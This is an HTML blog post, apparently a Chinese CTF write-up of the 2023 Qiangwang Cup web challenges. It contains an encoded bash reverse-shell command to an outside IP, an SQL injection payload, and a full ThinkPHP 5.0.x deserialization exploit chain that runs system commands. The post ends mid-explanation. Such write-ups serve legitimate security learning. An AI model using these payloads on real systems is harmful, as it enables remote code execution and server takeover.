@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z1d10t.fun","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023强网杯初赛WEB复现学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023强网杯初赛WEB复现学习">
+<meta property="og:url" content="https://z1d10t.fun/post/c9a1b8ba.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="2023强网杯初赛WEB复现学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906801408-33c301ba-0e03-412c-94b9-751a4de0cff4.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906913868-000427f6-1e19-4e3e-9d26-19b2975891c5.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957445255-8bac792d-be33-41c6-86bd-b544da669f13.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957636093-3ce0415f-1890-4a94-90bd-fee7ec6f996f.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958009453-a1598e89-2930-4682-a99a-13c070f0531d.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958048311-77ef2525-290f-4d3f-b18a-2e3a722cc710.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961512398-e6790213-91f4-4756-b225-d64896ea0645.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961662019-a4b3c0b6-334f-409b-a2c9-1720c9c9c90b.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961720434-8c0be840-303b-41ce-87bc-1e04f3aafbae.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961787825-08229a75-1038-4aca-8f6d-dddb6dd2deb1.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961926210-57776333-6a69-4cbc-a098-378188fc97c9.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962000796-d8a07081-ba60-473a-88de-68622e10e85f.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962450408-5c2cd26c-a85f-4dbd-bce7-939784dd8d56.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702962464453-4874790c-8e3d-4dc4-8569-c1ccbf5a5da9.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971190280-7ec590ae-3529-42d9-bd4d-99bdf3c54be3.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971298577-f25fd92a-db9a-43ad-b262-eb3dce893ef2.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971524833-f26caae8-de39-468a-b956-a8ce443ca468.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702971703269-e39ca43a-d1e9-4584-8bbd-3e5c53d4b6d2.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972367586-8be3bc25-e176-4464-b9b5-c663b53a5d65.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972401359-2ac1eb11-c1f4-47c8-85ec-24e0587b4fb5.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702972503070-1c67ca7a-917c-4e46-9a82-709ba0110556.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974066962-dff9e6bb-463a-4f0f-95dd-fabfc5e9aa22.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974868120-7a71d779-fe2a-428e-9af9-796aa473f4e7.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702974362330-1f194402-43f5-40b4-a5a1-49d8f11268c8.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975001753-fb10f6df-577c-4b61-b1e4-7369b1a6154d.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975747424-2f9e8e08-74a7-44f9-a925-e56bd17954c3.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702975946864-223a0edb-5233-425f-b630-f2deed26e9a1.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702978743938-c087ad37-acc8-44dc-8d8d-4fe6b84a4ab0.png">
+<meta property="article:published_time" content="2023-12-19T09:44:38.000Z">
+<meta property="article:modified_time" content="2023-12-19T09:46:18.390Z">
+<meta property="article:author" content="Z1d10t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906801408-33c301ba-0e03-412c-94b9-751a4de0cff4.png">
+
+
+<link rel="canonical" href="https://z1d10t.fun/post/c9a1b8ba.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z1d10t.fun/post/c9a1b8ba.html","path":"post/c9a1b8ba.html","title":"2023强网杯初赛WEB复现学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023强网杯初赛WEB复现学习 | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#happygame"><span class="nav-number">1.</span> <span class="nav-text">happygame</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkshop"><span class="nav-number">2.</span> <span class="nav-text">thinkshop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp5-0-x-RCE%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">thinkphp5.0.x RCE反序列链分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkshopping"><span class="nav-number">3.</span> <span class="nav-text">thinkshopping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">邪王真眼是最强的！</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">85</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z1d10t.fun/post/c9a1b8ba.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="邪王真眼是最强的！">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023强网杯初赛WEB复现学习 | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023强网杯初赛WEB复现学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-12-19 17:44:38 / 修改时间：17:46:18" itemprop="dateCreated datePublished" datetime="2023-12-19T17:44:38+08:00">2023-12-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>2023强网杯初赛WEB复现学习</p>
+<span id="more"></span>
+
+<h1 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h1><p>参考<a target="_blank" rel="noopener" href="https://literate-maraca-adc.notion.site/PC-1b8573e568b24b3886c6b8519394353f">Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.</a>然后用以下工具连接</p>
+<p>项目地址<a target="_blank" rel="noopener" href="https://github.com/fullstorydev/grpcui">GitHub - fullstorydev&#x2F;grpcui: An interactive web UI for gRPC, along the lines of postman</a></p>
+<p>之后是打cc6的反序列化链就行了 恶心的是有时候会莫名其妙报错弹不过来 得多打几次</p>
+<p>用ysoserial生成文件上传即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2LzM2LjE0MC45NS4xMjEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&gt;payload</span><br></pre></td></tr></table></figure>
+
+<h1 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先是给了附件 不是直接给了源码包 需要自己docker本地搭一下 </p>
+<p>根据给的readme搭就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内部端口80，flag为环境变量设置flag</span><br><span class="line">首先需要docker load &lt; thinkshop.tar</span><br><span class="line">docker run -tid --name thinkshop -p 36000:80 -e FLAG=flag&#123;test_flag&#125; thinkshop</span><br></pre></td></tr></table></figure>
+
+<p>搭建好之后直接来看<code>start.sh</code> 这里有一些初始化的操作</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906801408-33c301ba-0e03-412c-94b9-751a4de0cff4.png" alt="img"></p>
+<p>查看shop.sql可以发现 账号和密码 密码是123456的md5之后的值</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702906913868-000427f6-1e19-4e3e-9d26-19b2975891c5.png" alt="img"></p>
+<p>这里有个坑就是登录名不是admin而是1 因为find()在这里去找了主键列查询的是id</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957445255-8bac792d-be33-41c6-86bd-b544da669f13.png" alt="img"></p>
+<p>登录成功之后通过修改商品信息将序列化的数据利用sql注入存入数据库中 然后在商品展示界面会将我们的data部分数据反序列化</p>
+<p>利用点如下</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702957636093-3ce0415f-1890-4a94-90bd-fee7ec6f996f.png" alt="img"></p>
+<p>在商品信息更新这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function do_edit()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!session(&#x27;?admin&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;error(&#x27;请先登录&#x27;,&#x27;index/admin/login&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        $goodsModel = new Goods();</span><br><span class="line">        $data = input(&#x27;post.&#x27;);</span><br><span class="line">        $result = $goodsModel-&gt;saveGoods($data);</span><br><span class="line">        if ($result) &#123;</span><br><span class="line">            $this-&gt;success(&#x27;商品信息更新成功&#x27;, &#x27;index/index/index&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;error(&#x27;商品信息更新失败&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>input函数是一个自定义函数 会接收我们输入值 在这里是<code>$_POST</code>数组 然后会进入Good类中的saveGoods()</p>
+<p>我们跟进</p>
+<p>到save函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958009453-a1598e89-2930-4682-a99a-13c070f0531d.png" alt="img"></p>
+<p>接着会到Update类中的updatedata()</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702958048311-77ef2525-290f-4d3f-b18a-2e3a722cc710.png" alt="img"></p>
+<p>这里会对我们提交的整个post数组遍历</p>
+<p>并且对<code>$key</code>也就是键 未做任何限制以及过滤 存在sql注入</p>
+<p>注入形式为 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data`%3Dunhex(&#x27;十六进制数据&#x27;)/**/where/**/id%3D1/**/or/**/6%3D6#=1</span><br></pre></td></tr></table></figure>
+
+<p>这里还存在一个小点就是因为是键这里存在注入点 因此我们的恶意payload要全部放在键的位置</p>
+<p>所以第一个等号要url编码 </p>
+<p>此次之外php中变量中的空格会被当作非法符号会被转为<code>_</code>因此这里需要<code>/**/</code>来替代空格</p>
+<p>报错可以得知是5.0.23的版本</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961512398-e6790213-91f4-4756-b225-d64896ea0645.png" alt="img"></p>
+<p>直接找现成的exp 之后我也会调试过一遍这个链子 我分析过写文件的链子 这个直接rce的反而被我忽略了</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/317886.html">ThinkPHP5反序列化利用链总结与分析 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes&#123;</span><br><span class="line">    use think\model\Pivot;</span><br><span class="line">    ini_set(&#x27;display_errors&#x27;,1);</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files = [];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [new Pivot($function,$parameter)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = array(new Windows(&#x27;system&#x27;,&#x27;cat /*&#x27;));</span><br><span class="line">    echo bin2hex(base64_encode(serialize($a)));</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">    abstract class Model</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    class Pivot extends Model</span><br><span class="line">    &#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error;</span><br><span class="line">        public $parent;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;append[&#x27;jelly&#x27;] = &#x27;getError&#x27;;</span><br><span class="line">            $this-&gt;error = new relation\BelongsTo($function,$parameter);</span><br><span class="line">            $this-&gt;parent = new Output($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    abstract class Relation</span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    use think\db\Query;</span><br><span class="line">    use think\model\Relation;</span><br><span class="line">    abstract class OneToOne extends Relation</span><br><span class="line">    &#123;&#125;</span><br><span class="line">    class BelongsTo extends OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $query;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = false;</span><br><span class="line">            $this-&gt;query = new Query($function,$parameter);</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\db&#123;</span><br><span class="line">    use think\console\Output;</span><br><span class="line">    class Query</span><br><span class="line">    &#123;</span><br><span class="line">        protected $model;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = new Output($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    use think\session\driver\Memcache;</span><br><span class="line">    class Output</span><br><span class="line">    &#123;</span><br><span class="line">        protected $styles = [];</span><br><span class="line">        private $handle;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle = new Memcache($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver&#123;</span><br><span class="line">    use think\cache\driver\Memcached;</span><br><span class="line">    class Memcache</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler = null;</span><br><span class="line">        protected $config  = [</span><br><span class="line">            &#x27;expire&#x27;       =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;session_name&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        ];</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = new Memcached($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver&#123;</span><br><span class="line">    use think\Request;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line">        protected $options = [];</span><br><span class="line">        protected $tag;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            // pop链中需要prefix存在，否则报错</span><br><span class="line">            $this-&gt;options = [&#x27;prefix&#x27;   =&gt; &#x27;jelly/&#x27;];</span><br><span class="line">            $this-&gt;tag = true;</span><br><span class="line">            $this-&gt;handler = new Request($function,$parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">    class Request</span><br><span class="line">    &#123;</span><br><span class="line">        protected $get     = [];</span><br><span class="line">        protected $filter;</span><br><span class="line">        public function __construct($function,$parameter)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;filter = $function;</span><br><span class="line">            $this-&gt;get = [&quot;jelly&quot;=&gt;$parameter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里还有细节 就是如果我们直接用找到的exp是打不通的 会报错 </p>
+<p>为什么呢</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961662019-a4b3c0b6-334f-409b-a2c9-1720c9c9c90b.png" alt="img"></p>
+<p>我们来看源码在index.php</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961720434-8c0be840-303b-41ce-87bc-1e04f3aafbae.png" alt="img"></p>
+<p>这里会调用getGoodsById()这个函数 通过id将商品信息展示出来 我们跟进</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961787825-08229a75-1038-4aca-8f6d-dddb6dd2deb1.png" alt="img"></p>
+<p>这里存在if语句 只有当我们的序列化前三个字符为YTo时候才能正常返回数据 不然就会报错</p>
+<p>那么如果我们直接用现成的exp得到的payload 是以Yzo开头的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702961926210-57776333-6a69-4cbc-a098-378188fc97c9.png" alt="img"></p>
